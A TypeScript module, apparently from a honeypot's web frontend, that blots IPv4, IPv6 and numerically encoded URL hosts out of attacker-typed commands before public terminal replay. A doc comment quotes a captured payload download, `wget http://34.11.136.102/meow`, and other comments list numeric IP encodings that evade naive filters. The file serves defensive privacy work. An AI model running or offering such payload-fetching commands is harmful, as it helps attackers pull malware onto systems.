/**
 * Mask IPv4/IPv6 literals inside attacker-controlled text (command input,
 * download URLs) before it is rendered. Honeywatch's privacy posture is that no
 * IP is ever shown in the public terminal replay -- the attacker's own src_ip
 * is already stripped by the API, but C2 / payload hosts appear *inside* what
 * the attacker typed (e.g. `wget http://34.11.136.102/meow`), so they must be
 * blotted here on the frontend.
 *
 * Output is a segment list so the renderer can wrap each blot in a styled span
 * (no v-html / no XSS surface). Always applied -- the redaction policy is fixed
 * to "always blot".
 */

export interface RedactSegment {
  text: string
  redacted: boolean
}

export interface RedactResult {
  segments: RedactSegment[]
  /** Redacted form as a single string (blots replaced by `token`). */
  text: string
  /** Number of IP literals masked. */
  count: number
}

export const IP_BLOT = '‹ip›'

// IPv4: four dot-separated octets 0-255.
const IPV4 = String.raw`(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)`

// IPv6: the canonical matcher. Every branch is either 8 full groups or contains
// a `::` run, so decimal clock strings like "13:41:49" (3 groups, no `::`) can
// never match -- avoiding the classic false positive. The first three branches
// cover the legacy IPv4-in-IPv6 forms (e.g. `2001:db8::1.2.3.4`, `::ffff:1.2.3.4`)
// so the trailing dotted-quad is consumed as part of the literal, not left in
// cleartext after the v6 prefix is blotted.
const IPV6_CORE = [
  String.raw`(?:[0-9A-Fa-f]{1,4}:){6}${IPV4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,4}:${IPV4}`,
  String.raw`::(?:[0-9A-Fa-f]{1,4}:){0,5}${IPV4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,7}:`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,6}:[0-9A-Fa-f]{1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,5}(?::[0-9A-Fa-f]{1,4}){1,2}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,4}(?::[0-9A-Fa-f]{1,4}){1,3}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,3}(?::[0-9A-Fa-f]{1,4}){1,4}`,
  String.raw`(?:[0-9A-Fa-f]{1,4}:){1,2}(?::[0-9A-Fa-f]{1,4}){1,5}`,
  String.raw`[0-9A-Fa-f]{1,4}:(?::[0-9A-Fa-f]{1,4}){1,6}`,
  String.raw`:(?:(?::[0-9A-Fa-f]{1,4}){1,7}|:)`,
].join('|')

// IPv6 must be bounded by a non hex/colon char so we never grab a partial token.
const IPV6 = String.raw`(?<![0-9A-Fa-f:])(?:${IPV6_CORE})(?:%[0-9A-Za-z]+)?(?![0-9A-Fa-f:])`

// Standalone dotted-quad IPv4. The lookbehind/lookahead reject a 5th adjacent
// octet so version strings like `lib.so.1.2.3.4.5` are not partially blotted,
// while a real IP at a sentence end (`from 1.2.3.4.`) still matches.
const IPV4_STANDALONE = String.raw`(?<!\d\.)\b${IPV4}\b(?!\.\d)`

// Alternate-encoding hosts only carry meaning right after a URL scheme, so we
// anchor on `scheme://[userinfo@]` and blot the host when it is a bare decimal
// (`http://2130706433/`), hex (`http://0x7f000001/`), octal, or dotted-hex/octal
// (`http://0x7f.1/`) integer -- all of which resolve to an IP but slip past the
// dotted-quad matcher.
const NUMERIC_HOST = String.raw`(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d{1,10})(?:\.(?:0[xX][0-9A-Fa-f]+|0[0-7]+|\d{1,10})){0,3}`
// `(?!:[0-9A-Fa-f]*:)` stops the host rule from swallowing the leading group of an
// (unbracketed) IPv6 literal like `2001:db8::1.2.3.4`, which the IPv6 rule then
// matches in full instead of leaving a `db8` fragment behind.
const URL_NUMERIC_HOST = String.raw`(?<scheme>\bhttps?:\/\/(?:[^/?#\s@]+@)?)(?<host>${NUMERIC_HOST})(?!:[0-9A-Fa-f]*:)(?=[/:?#\s]|$)`

// Recognize an already-inserted blot token. The API redacts IPs server-side
// (the authoritative gate), so text usually arrives pre-blotted; matching the
// token keeps it rendered as a styled blot, and this stays defense-in-depth for
// any IP the backend somehow missed.
const BLOT_RE = IP_BLOT.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')

// Order matters. The blot token first; then IPV6 (incl. embedded-v4 forms) so a
// full literal is consumed as one match -- otherwise the numeric-host rule below
// would grab the leading group of an unbracketed `host::a.b.c.d` and leave a hex
// fragment. Dotted-quad IPV4 next. The numeric-host URL rule is last: it only
// fires for non-dotted hosts (decimal/hex/octal) that the IP rules can't see.
const IP_SOURCE = `(?:${BLOT_RE})|(?:${IPV6})|(?:${IPV4_STANDALONE})|(?:${URL_NUMERIC_HOST})`

export function redactIps(text: string, token: string = IP_BLOT): RedactResult {
  const segments: RedactSegment[] = []
  const re = new RegExp(IP_SOURCE, 'g')
  let last = 0
  let count = 0

  let m: RegExpExecArray | null
  while ((m = re.exec(text)) !== null) {
    if (m[0].length === 0) {
      // Defensive: a zero-width match would loop forever; advance past it.
      re.lastIndex++
      continue
    }
    const scheme = m.groups?.scheme
    const host = m.groups?.host
    if (scheme !== undefined && host !== undefined) {
      // URL with a numeric host: keep `scheme://[user@]`, blot only the host.
      const blotStart = m.index + scheme.length
      if (blotStart > last) segments.push({ text: text.slice(last, blotStart), redacted: false })
      segments.push({ text: token, redacted: true })
      count++
      last = blotStart + host.length
    } else {
      if (m.index > last) segments.push({ text: text.slice(last, m.index), redacted: false })
      segments.push({ text: token, redacted: true })
      count++
      last = m.index + m[0].length
    }
  }
  if (last < text.length) segments.push({ text: text.slice(last), redacted: false })

  return { segments, text: segments.map((s) => s.text).join(''), count }
}
